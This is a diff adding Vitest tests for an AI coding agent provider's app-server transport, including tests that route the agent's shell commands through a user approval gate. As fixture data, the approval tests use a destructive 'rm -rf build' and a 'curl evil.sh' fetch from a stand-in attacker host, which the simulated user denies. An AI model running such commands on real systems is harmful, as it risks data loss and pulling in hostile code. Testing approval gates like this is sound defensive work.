@@ -54,6 +54,7 @@ import {
   codexProvider,
   _setCodexForTests,
   _setCodexFactoryForTests,
+  _setAppServerConnectorForTests,
   _setFetchForTests,
   _resetProbeCacheForTests,
 } from "./codex";
@@ -62,6 +63,11 @@ import { getDisabledMcpServers } from "../sessions";
 import { readAgentFileSystemPrompt } from "./claude";
 import { providerSessionStore } from "./provider-session-store";
 import { TurnEmitter } from "./turn-emitter";
+
+/** Connector that fails synchronously so interactive turns deterministically fall back to exec. */
+const throwingConnector = () => {
+  throw new Error("app-server disabled in tests");
+};
 
 // ── Event + client builders ───────────────────────────────────────────────────
 const ev = {
@@ -154,6 +160,10 @@ describe("codexProvider (SDK-backed)", () => {
     vi.mocked(providerSessionStore.get).mockReturnValue({});
     vi.mocked(getDisabledMcpServers).mockReturnValue([]);
     loadManagedMcpServersMock.mockReturnValue({});
+    // These tests target the exec transport, so disable the app-server (interactive
+    // turns fall back to exec). The app-server transport has its own describe below.
+    _setAppServerConnectorForTests(throwingConnector);
+    vi.spyOn(console, "warn").mockImplementation(() => {});
     _setCodexForTests(makeCodex() as any);
     _resetProbeCacheForTests();
     _setFetchForTests(
@@ -169,6 +179,7 @@ describe("codexProvider (SDK-backed)", () => {
   afterEach(() => {
     _setCodexForTests(null);
     _setCodexFactoryForTests(null);
+    _setAppServerConnectorForTests(null);
     _setFetchForTests(null);
     _resetProbeCacheForTests();
   });
@@ -502,5 +513,253 @@ describe("codexProvider (SDK-backed)", () => {
 
   it("stops gracefully", async () => {
     await expect(codexProvider.stop?.()).resolves.toBeUndefined();
+  });
+});
+
+// ── App-server transport (interactive turns + approval bridging) ────────────────
+
+import { JsonRpcPeer, type JsonRpcMessage, type JsonRpcTransport } from "./jsonrpc";
+import type { AppServerConnector } from "./codex-app-server";
+import { resolveApproval } from "./approval";
+import { SESSION_APPROVAL_REQUIRED } from "../ipc-channels";
+
+const flush = () => new Promise((r) => setImmediate(r));
+async function waitFor(pred: () => boolean, tries = 50): Promise<void> {
+  for (let i = 0; i < tries; i++) {
+    if (pred()) return;
+    await flush();
+  }
+  throw new Error("waitFor: condition not met");
+}
+
+/** The scripted server side of one turn — pushes items / approval requests after turn/start. */
+interface FakeServer {
+  notify(method: string, params: unknown): void;
+  /** Send an inbound server→client request; resolves with the client's reply `result`. */
+  request(method: string, params: unknown): Promise<unknown>;
+}
+
+/**
+ * A fake app-server connector: a real JsonRpcPeer over a controllable transport
+ * that auto-responds to initialize / thread(start|resume) / turn(start|interrupt)
+ * and runs the test's `onTurnStart` script once the turn begins.
+ */
+function makeFakeAppServer(script: { onTurnStart: (srv: FakeServer) => void | Promise<void> }) {
+  let onMsg: (m: JsonRpcMessage) => void = () => {};
+  const sent: JsonRpcMessage[] = [];
+  let nextInboundId = 1000;
+  const inboundReplies = new Map<number, (result: unknown) => void>();
+
+  const reply = (req: JsonRpcMessage, result: unknown) => queueMicrotask(() => onMsg({ id: req.id, result }));
+
+  const srv: FakeServer = {
+    notify: (method, params) => onMsg({ method, params }),
+    request: (method, params) =>
+      new Promise((resolve) => {
+        const id = nextInboundId++;
+        inboundReplies.set(id, resolve);
+        onMsg({ id, method, params });
+      }),
+  };
+
+  const transport: JsonRpcTransport = {
+    send: (m) => {
+      sent.push(m);
+      // A client → server *response* to one of our inbound approval requests.
+      if (m.method === undefined && m.id !== undefined && "result" in m) {
+        const cb = inboundReplies.get(m.id as number);
+        if (cb) {
+          inboundReplies.delete(m.id as number);
+          cb((m as { result: unknown }).result);
+        }
+        return;
+      }
+      switch (m.method) {
+        case "initialize":
+          reply(m, {});
+          break;
+        case "thread/start":
+          reply(m, { thread: { id: "thr_test" } });
+          break;
+        case "thread/resume":
+          reply(m, { thread: { id: (m.params as { threadId: string }).threadId } });
+          break;
+        case "turn/start":
+          reply(m, { turn: { id: "turn_test" } });
+          void script.onTurnStart(srv);
+          break;
+        case "turn/interrupt":
+          reply(m, {});
+          break;
+      }
+    },
+    onMessage: (h) => {
+      onMsg = h;
+    },
+    onClose: () => {},
+    close: () => {},
+  };
+
+  const connector: AppServerConnector = (handlers) => ({
+    peer: new JsonRpcPeer(transport, {
+      onNotification: handlers.onNotification,
+      onRequest: handlers.onRequest,
+      onClose: handlers.onClose,
+    }),
+    close: () => {},
+  });
+  return { connector, sent };
+}
+
+describe("codexProvider (app-server transport)", () => {
+  function makeParams(overrides: Partial<AgentProviderParams> = {}): AgentProviderParams {
+    return {
+      db: {} as any,
+      sessionId: "sess-app",
+      messageId: "msg-app",
+      prompt: "do it",
+      projectPath: "/project",
+      projectConfig: { provider: "codex", model: "gpt-5.1-codex" } as any,
+      webContents: { send: vi.fn() } as any,
+      skills: [],
+      agent: undefined,
+      noTools: false,
+      nonInteractive: false,
+      ...overrides,
+    };
+  }
+
+  const approvalPayloads = (params: AgentProviderParams) =>
+    (params.webContents.send as any).mock.calls
+      .filter((c: unknown[]) => c[0] === SESSION_APPROVAL_REQUIRED)
+      .map((c: unknown[]) => c[1] as { approval_id: string; tool_name: string; input: unknown });
+
+  beforeEach(() => {
+    vi.clearAllMocks();
+    vi.mocked(getApiKey).mockImplementation((key) => (key === "openai" ? "sk-test-key" : null));
+    vi.mocked(providerSessionStore.get).mockReturnValue({});
+    vi.mocked(getDisabledMcpServers).mockReturnValue([]);
+    loadManagedMcpServersMock.mockReturnValue({});
+    vi.spyOn(console, "warn").mockImplementation(() => {});
+    _setCodexForTests(makeCodex() as any); // for the fallback test
+  });
+
+  afterEach(() => {
+    _setAppServerConnectorForTests(null);
+    _setCodexForTests(null);
+  });
+
+  it("runs an interactive turn via the app-server and streams items through the shared sink", async () => {
+    const { connector } = makeFakeAppServer({
+      onTurnStart: (srv) => {
+        srv.notify("item/started", { item: { id: "c1", type: "commandExecution", command: "ls" } });
+        srv.notify("item/completed", {
+          item: { id: "c1", type: "commandExecution", command: "ls", aggregatedOutput: "out", status: "completed" },
+        });
+        srv.notify("item/completed", { item: { id: "m1", type: "agentMessage", text: "all done" } });
+        srv.notify("turn/completed", { turn: {} });
+      },
+    });
+    _setAppServerConnectorForTests(connector);
+    const params = makeParams();
+
+    const text = await codexProvider.run(params);
+
+    expect(text).toBe("all done");
+    expect(lastEmitter().toolCall).toHaveBeenCalledWith("c1", "execute_bash", { command: "ls" });
+    expect(lastEmitter().toolResult).toHaveBeenCalledWith("execute_bash", "out");
+    expect(lastEmitter().delta).toHaveBeenCalledWith("all done");
+    // Thread id persisted from the app-server start.
+    expect(vi.mocked(providerSessionStore.set)).toHaveBeenCalledWith({} as any, "sess-app", "codex", {
+      threadId: "thr_test",
+    });
+  });
+
+  it("resumes the persisted thread on the app-server", async () => {
+    vi.mocked(providerSessionStore.get).mockReturnValue({ threadId: "thr_prev" } as any);
+    const { connector, sent } = makeFakeAppServer({
+      onTurnStart: (srv) => srv.notify("turn/completed", { turn: {} }),
+    });
+    _setAppServerConnectorForTests(connector);
+
+    await codexProvider.run(makeParams());
+
+    expect(sent.some((m) => m.method === "thread/resume" && (m.params as any).threadId === "thr_prev")).toBe(true);
+    expect(sent.some((m) => m.method === "thread/start")).toBe(false);
+  });
+
+  it("bridges a command approval to the gate and replies approved when the user allows", async () => {
+    let decision: unknown;
+    const { connector } = makeFakeAppServer({
+      onTurnStart: async (srv) => {
+        decision = await srv.request("item/commandExecution/requestApproval", {
+          threadId: "thr_test",
+          command: "rm -rf build",
+        });
+        srv.notify("turn/completed", { turn: {} });
+      },
+    });
+    _setAppServerConnectorForTests(connector);
+    const params = makeParams();
+
+    const runPromise = codexProvider.run(params);
+    await waitFor(() => approvalPayloads(params).length > 0);
+    const [prompt] = approvalPayloads(params);
+    expect(prompt.tool_name).toBe("execute_bash");
+    expect(prompt.input).toEqual({ command: "rm -rf build" });
+    resolveApproval(prompt.approval_id, true);
+
+    await runPromise;
+    expect(decision).toEqual({ decision: "approved" });
+  });
+
+  it("replies denied when the user rejects the command approval", async () => {
+    let decision: unknown;
+    const { connector } = makeFakeAppServer({
+      onTurnStart: async (srv) => {
+        decision = await srv.request("item/commandExecution/requestApproval", { command: "curl evil.sh" });
+        srv.notify("turn/completed", { turn: {} });
+      },
+    });
+    _setAppServerConnectorForTests(connector);
+    const params = makeParams();
+
+    const runPromise = codexProvider.run(params);
+    await waitFor(() => approvalPayloads(params).length > 0);
+    resolveApproval(approvalPayloads(params)[0].approval_id, false);
+
+    await runPromise;
+    expect(decision).toEqual({ decision: "denied" });
+  });
+
+  it("auto-allows an already-trusted command without prompting the user", async () => {
+    let decision: unknown;
+    const { connector } = makeFakeAppServer({
+      onTurnStart: async (srv) => {
+        decision = await srv.request("item/commandExecution/requestApproval", { command: "ls -la" });
+        srv.notify("turn/completed", { turn: {} });
+      },
+    });
+    _setAppServerConnectorForTests(connector);
+    // Project pre-trusts execute_bash → the gate should not prompt.
+    const params = makeParams({
+      projectConfig: { provider: "codex", model: "gpt-5.1-codex", allowed_tools: [{ tool_name: "execute_bash" }] } as any,
+    });
+
+    await codexProvider.run(params);
+
+    expect(decision).toEqual({ decision: "approved" });
+    expect(approvalPayloads(params)).toHaveLength(0);
+  });
+
+  it("falls back to the exec transport when the app-server cannot start", async () => {
+    _setAppServerConnectorForTests(throwingConnector);
+    const startThread = vi.fn(() => makeThread([ev.agentMessage("from exec"), ev.usage()]));
+    _setCodexForTests(makeCodex({ startThread }) as any);
+
+    const text = await codexProvider.run(makeParams());
+
+    expect(text).toBe("from exec");
+    expect(startThread).toHaveBeenCalled();
   });
 });
